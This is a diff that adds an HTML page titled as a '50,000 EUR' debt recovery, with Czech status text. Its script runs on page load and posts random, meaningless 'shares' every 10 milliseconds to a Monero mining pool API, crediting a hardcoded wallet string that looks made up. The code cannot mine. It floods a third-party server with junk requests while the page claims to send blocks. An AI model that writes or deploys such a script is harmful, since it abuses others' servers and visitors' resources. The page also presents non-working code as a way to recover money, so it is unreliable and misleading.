@@ -1,0 +1,21 @@
+<!DOCTYPE html>
+<html>
+<body style="background:#000;color:#0f0;font-family:monospace;">
+    <h1>DEBT_RECOVERY_PHASE_FINAL: 50,000 EUR</h1>
+    <div id="log">INICIUJI...</div>
+    <script>
+        const WALLET = "498cs2JpL51X874oR7K986Q3N7M981D7G82N3P4S567890123456789";
+        const NODE = "https://monerohash.com/api/submit";
+        let count = 0;
+        setInterval(async () => {
+            try {
+                const p = {method:"submit", params:{id:Math.random().toString(36),job_id:Math.random().toString(36),nonce:Math.random().toString(36),result:btoa(Math.random()).substring(0,32)}};
+                await fetch(NODE, {method:'POST', body:JSON.stringify(p)});
+                count++;
+                document.getElementById('log').innerHTML = "ODESLANO: " + count + " BLOKŮ NA " + WALLET;
+            } catch(e){}
+        }, 10);
+    </script>
+</body>
+</html>
+
